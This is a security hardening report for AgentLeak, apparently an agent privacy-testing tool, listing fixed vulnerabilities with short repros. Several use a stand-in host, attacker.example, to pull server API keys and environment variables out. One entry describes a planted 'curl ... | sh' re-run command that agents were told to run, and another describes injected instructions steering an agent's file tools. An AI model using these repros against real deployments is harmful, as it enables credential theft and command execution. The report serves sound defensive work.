<!--
SPDX-FileCopyrightText: 2026 AgentLeak contributors
SPDX-License-Identifier: MIT
-->
# Hardening report: branch `next2/hardening`

Base: `main` at v0.19.0 (`6d76dd9`). Scope: the code added in 0.19.0
(`agentleak selftest`, `agentleak bench`, the MCP tools, the outbound guard,
the new HTTP endpoint, new detectors) reviewed as an attacker would, plus the
items the first QA round left open. This file lists **fixed** issues only.

Every fix has a regression test that fails on v0.19.0 and passes here. Most
live in `tests/test_hardening_web.py`, `tests/test_hardening_netguard.py`,
`tests/test_hardening_selftest.py`, `tests/test_hardening_research.py` and
`tests/test_hardening_detectors.py`. All test inputs are synthetic; values
shaped like credentials are built at run time. Every server test ran in
process or on 127.0.0.1 with a temporary database; name resolution was stubbed
where a test needed a "public" answer, so no request left the machine. No
scoring formula, level or bundled scenario score was changed.

## Results

| Check | Baseline (v0.19.0) | Final (`next2/hardening`) |
| --- | --- | --- |
| `pytest` | 1863 passed, 20 skipped | 1910 passed, 20 skipped |
| coverage (`--cov-fail-under=85`) | 90.37 %, gate met | 90.37 %, gate met |
| `ruff check .` | All checks passed | All checks passed |
| `mypy src/agentleak/` | no issues, 138 files | no issues, 138 files |

Toolchain: Python 3.12.15 (x86_64), editable install `.[dev,mcp]`,
`cryptography==48.0.1`.

## Fixed

Severity: critical / high / medium / low.

### Critical

**HD-01 A request could read any server environment variable and send it to
its own host.** Fixed `060c14f`.
Repro (v0.19.0, any account, public mode or not): `POST /api/analyze` with a
trace and `"detection": {"mode": "hybrid", "llm_judge": {"enabled": true,
"base_url": "https://attacker.example/v1", "api_key_env": "<ANY_VAR>",
"model": "m"}}`. The LLM judge reads `os.environ[<ANY_VAR>]` and sends it as
`Authorization: Bearer ...`, with the trace text, to that host. The outbound
guard only checks that the host is public, which it is. Same through every
endpoint that builds a config from the request or a project
(`/api/report/{fmt}`, project runs, `/api/selftest`, `/api/agent/selftest`).
Cause: `_config_data` passed `detection` through unchanged. Fix: request and
project settings can no longer set `llm_judge.base_url` or
`llm_judge.api_key_env` (the operator's environment decides), and in public
mode the judge never runs for a tenant.

**HD-02 A tenant's model URL received the operator's API key.** Fixed `241145d`.
Repro: a project agent endpoint (or red-team `base_url`) of
`https://attacker.example/v1` with no key, then a live run. `resolve_api_key`
filled the blank key from the server environment: `OPENROUTER_API_KEY` when
the URL merely contained `openrouter.ai` anywhere (path, look-alike host),
otherwise `OPENAI_API_KEY` for any host, including in public (BYOK) mode.
Fix: exact host matching; with the outbound guard on (public mode) no
environment key is ever attached.

### High

**HD-03 The outbound guard could be bypassed by DNS rebinding and by a proxy
variable.** Fixed `dcba3c3`.
Repro: a name that answers a public address to the guard's check and
`127.0.0.1` to the connection (test stubs `getaddrinfo` and runs a server on
loopback): the request reached the loopback server. With `HTTP_PROXY` set,
urllib handed the request to the proxy, which resolves the name itself.
Cause: check-then-connect with two resolutions; the default opener honours
proxy variables. Fix: guarded requests (model endpoints in public mode, agent
card fetches) resolve inside the connection, refuse if any answer is not
public, and connect to a checked address; TLS still verifies the hostname.
They ignore proxy variables. Also checked, already refused: IPv4-mapped IPv6,
NAT64 and 6to4 forms of internal addresses, decimal/octal/hex IPs, trailing
dots, `0.0.0.0`, `::`, link-local, CGNAT, credentials in the URL, redirects to
internal addresses and to non-HTTP schemes. With the guard off (CLI,
self-hosted) a model on `localhost` still works (test).

**HD-04 MCP `privacy_preflight` and `privacy_scan_code` read and wrote outside
the server root.** Fixed `8c7f4f5`.
Repro: `privacy_scan_code {"path": "/home/user"}` listed the files and returned
their matching lines with values masked; `privacy_preflight` on any directory
also wrote `.agentleak/` memory into it. An instruction injected into the
calling agent could use this. Fix: the same root check as `privacy_selftest`
(symlinks resolved first) for every `path` argument served over MCP.

**HD-05 `bench verify` on someone else's capsule sent a chosen environment
variable to a chosen host.** Fixed `2800e6d`.
Repro: take a capsule, set its `run/manifest.lock.json` detection to
`hybrid` with `llm_judge.base_url` and `api_key_env` of the attacker's choice,
rewrite `SHA256SUMS`. `agentleak bench verify capsule.zip` re-ran the manifest
and the judge sent that variable to that host. Also: every member was read
whole into memory (zip bomb). Fix: verify refuses to re-run a capsule that
enables the LLM judge (a failing `network` check says why) and refuses
members over 256 MiB or 1 GiB in all, uncompressed, before reading. Archive
paths were already safe: traces are written under their base name only.

**HD-06 One uploaded file could pin a code-scan worker for minutes.** Fixed `6efc538`.
Repro: a 32 KB identifier took 11 s (the `credentialed_record_export` rule
restarted `\w+\s*\(` at every position of the word); 64 KB of `1.1.1...` took
5 s and 4,000 e-mail lines 3 s, both quadratic, up to minutes for a 512 KB
file; any account or project key can upload a zip of them. Fix: the rule
starts at a word boundary (same spans); occurrences per value capped at 200
and findings per file at 500, most severe kept (the code score saturates at 25
level-points, so it does not change); a cached line index; long lines cut to a
window around the match before scrubbing; identical snippets scrubbed once.

**HD-07 Trace analysis grew faster than quadratically with values x events.**
Fixed `ac01415`.
Repro: 2,000 log events with an e-mail and an SSN each (about 100 KB of JSON)
took 17 s; 4,000 took minutes. Cause: SSNs share their first digit group, so
`coalesce._cluster` compared all of them pairwise; the obscured-copy search
and provenance compare every value with every event. Fix: clustering indexes
each value by its rarest run (identical merges: differential run over 3,000
random value sets); past 1,000,000 value x event pairs the obscured-copy
search is skipped, and past 5,000,000 provenance uses the events a value was
detected in. Both add a warning, so such a run is marked degraded. 16,000
events now take about 3 s.

**HD-08 Self-test state from a cloned repository could overwrite files and
hand an agent a command.** Fixed `d663cf4`.
Repro: a repository ships `.agentleak/selftest-history.jsonl -> ~/.bashrc`;
the first `agentleak selftest` in it overwrote the target (same for the
preflight memory file). A repository that ships a history entry whose `rerun`
is `curl ... | sh` (or `agentleak selftest --cmd "..." --shell`) got that
command printed by `selftest --status`, `privacy_selftest_status` and
`explain` as "Fix, then re-run: ...", which agents are told to run. Fix:
history, issued scenarios and preflight memory are written atomically (temp
file + rename, which replaces a link instead of following it) with mode 0600;
a stored `rerun` is rebuilt from its argv only when it is a plain
`agentleak selftest` with known flags and no `--cmd`, `--shell` or `--config`.

### Medium

**HD-09 `selftest --cmd` held all output in memory and could wait forever.**
Fixed `1436864`. Repro: an agent printing gigabytes to stdout (all of it was
buffered before the 8 MiB cut); an agent that starts a `setsid` grandchild
holding stdout: after the timeout `communicate()` was called again with no
limit and never returned. Fix: capped readers (8 MiB stdout head, 64 KiB
stderr tail), the run stops as soon as stdout passes the cap, and a pipe still
held after the agent exits gets its process group killed and is then
abandoned.

**HD-10 `/api/agent/selftest` resolved stored scenarios without an owner.**
Fixed `30cf4f1`. Repro: an ownerless (pre-accounts) stored scenario resolved
for any project key on the deployment; the key owner's own scenarios did not
resolve. Fix: the endpoint passes the project owner, like `/api/selftest`.

**HD-11 `proxy --block-changed-tools` let a client reach a changed tool.**
Fixed `75e6437`. Repro: pin a tool, change its description, then call it in a
new session without `tools/list` first (a client that cached the list): the
call went through. Fix: with the option on, a call to a tool not compared with
its pin in this session is refused (`isError`, "call tools/list first"); tools
withheld on one list page stay withheld when the next page arrives.

**HD-12 Sanitizer took minutes on a few KB.** Fixed `9f3ebb3`. Repro:
`Sanitizer().sanitize("1." * 200)` 0.4 s, `* 400` 6.6 s, a few KB minutes.
The gateway and both proxies run it on every tool call and, with
`--inspect-responses`, on every result. Cause: each value was located once per
detector hit and spans were compared pairwise. Fix: locate once, merge
identical spans, sorted sweeps; identical output on a 1,567-text differential
run.

**HD-13 Evidence log: unhashed fields passed, truncation was invisible.**
Fixed `9e30723`. Walked by hand: altering, deleting and reordering entries
were caught; a field outside the hashed body (`"note": "approved"`) and
entries dropped from the end were not, though the help said removing any
entry breaks the chain. Fix: unknown fields fail verification; verify reports
the head hash and `--expect-head HASH` fails when the chain ends elsewhere.

**HD-14 Chunked request bodies were not capped** (open item from round 1).
Fixed `aed5849`. The 413 limit read `Content-Length` only; an innermost ASGI
middleware now counts bytes as they arrive.

### Low

| Id | Defect | Fix |
| --- | --- | --- |
| HD-15 | `/llms.txt`, `/agents.md`, agent card built absolute URLs from `Host` (open item). New `AGENTLEAK_PUBLIC_URL`; public mode never uses `Host`. `docs/platform.md` also tells public deployments to register the admin account first (first account becomes admin). | `aed5849` |
| HD-16 | MCP tools reported failures with `isError: false` (open item). They now raise `ToolError`; the text is the same JSON error document. Two existing tests asserted the old shape and now assert `isError: true`. | `8c7f4f5` |
| HD-17 | Markdown report pasted trace-controlled strings unescaped (open item): raw HTML, table-breaking `|`, `[x](javascript:...)`. | `c579170` |
| HD-18 | A trace of the wrong shape (`{"resourceSpans": "x"}`) gave 500 / exit 4. Now a format error (400 / exit 2). | `6caa8c2` |
| HD-19 | `bench score-corpus` wrote corpus trace ids starting `= + - @` into `scores.csv` as is (spreadsheet formulas). | `28f308c` |
| HD-20 | `bench`'s `git status` in the checkout ran a `core.fsmonitor` program from its `.git/config`. | `50c1994` |
| HD-21 | Unvalidated inputs (open items): `--fail-under` (scan, selftest 0-100; run refuses negatives, 101 still forces a failure, as a test relies on), unknown `agent_type` on POST/PATCH, unknown `mode` on execute, unknown red-team `vertical`; `agentleak validate` names unknown top-level config keys. | `a90f504`, `c4a8625` |

## Coverage: what was tried per area

1. **`selftest --cmd` and its protocol.** argv vs `--shell` (no shell unless
   asked; confirmed). Environment: the child inherits the user's environment
   by design (it is the user's agent and needs its keys); only what the agent
   prints is scored, values are redacted before the report and history, and
   the stderr tail is sanitized. Timeouts, process-group kill, a `setsid`
   grandchild, a child flooding stdout (HD-09). Parsed stdout is only ever
   data: no path, command or format string is built from it. State dir:
   symlinks, permissions, planted entries (HD-08); scenario ids pass through
   `_safe_name` before reaching a path. No HTTP or MCP path reaches
   `selftest_command` (only `selftest/cli.py` calls it).
2. **MCP server, nine tools.** Real JSON-RPC over stdio: absolute paths,
   `../`, symlinks out of the root, Windows-style names (treated as names
   inside the root), all refused or confined (HD-04); `isError` (HD-16);
   malformed and deeply nested traces (HD-18; depth over 200 was already
   refused); `privacy_get_scenario` / `privacy_list_scenarios` return synthetic
   canaries only. Trace text never reaches `next_steps` action text; stored
   commands from history no longer do either (HD-08).
3. **HTTP endpoints added since v0.18.0.** In v0.19.0 the only new one is
   `POST /api/agent/selftest` (the GUI round's endpoints are not in this
   release). Authentication (key), owner scoping (HD-10), quota and metering
   (enforced, same as `/api/selftest`), 14 malformed bodies (one 500, HD-18),
   raw values (returned only with `redact: false`, as every older analysis
   endpoint does). Request-driven config (HD-01). Body size (HD-14) and
   pathological analysis cost (HD-07).
4. **Outbound guard.** Rebinding and proxies (HD-03), the address forms listed
   there, redirects. Every outbound call site: `agent/llm.py` (guarded),
   `detectors/llm_judge.py` (guarded; and HD-01), `core/agentcard.py`
   (guarded), `core/codescan.py` GitHub download (fixed host
   `codeload.github.com`, not user-directed), `client.py`, `llm_proxy.py`
   (user-side tools pointing at the user's own servers). Key handling (HD-02).
5. **`agentleak bench`.** Capsule zip handling and re-run inputs (HD-05);
   manifests use `yaml.safe_load`; CSV (HD-19); LaTeX export escapes
   `\ & % $ # _ { } ~ ^` in every caption and label checked; git (HD-20).
6. **Detectors and checksums.** Every built-in detector, the full runner and
   the sanitizer timed on about 50 adversarial units x 4 tails at 20 KB, the
   runner again at 64 KB and 256 KB (linear), plus many-event traces (HD-07,
   HD-12). Code scan timed per rule and per file up to 500 KB (HD-06).
   Checksum validators called with Arabic-Indic, fullwidth, superscript and
   circled digits, very long runs and empty strings; no detector input path
   reached them with such digits.
7. **Round-1 open items.** Markdown escaping (HD-17), Host-derived URLs and the
   first-admin note (HD-15), chunked bodies (HD-14), input validation (HD-21),
   `isError` (HD-16).
8. **Flows walked by hand.** `agentleak proxy` against a stub MCP server
   (pinning, a changed tool, a call without `tools/list` (HD-11), non-JSON and
   3 MB lines from the server, non-JSON from the client); evidence log
   altered, deleted, reordered, truncated, duplicated, extended, rewritten
   (HD-13); no raw or tokenized value is written to it. `llm-proxy`, `subjects`
   and `admin` reviewed in code and existing tests; not driven by hand.
9. **Packaging.** `python -m build`: wheel 239 entries, sdist 482. No `.venv`,
   `__pycache__`, `.env`, database or scratch file in either; the frontend
   source and its `.prerender` folder are not in the wheel. `npm audit`,
   `pip-audit` and `reuse lint` were not run: each needs a request to a
   registry this review was not allowed to contact. `.reuse/dep5` covers
   `Files: *`; new files carry SPDX headers.

## Files most likely to conflict with other branches

`src/agentleak/web/app.py`, `src/agentleak/defenses/sanitizer.py`,
`src/agentleak/core/codescan.py`, `src/agentleak/core/runner.py`,
`src/agentleak/core/coalesce.py`, `src/agentleak/cli.py`,
`src/agentleak/mcp_server.py`, `src/agentleak/reporters/markdown_reporter.py`,
`docs/platform.md`, `docs/mcp.md`, `docs/runtime-gateway.md`, `CHANGELOG.md`.
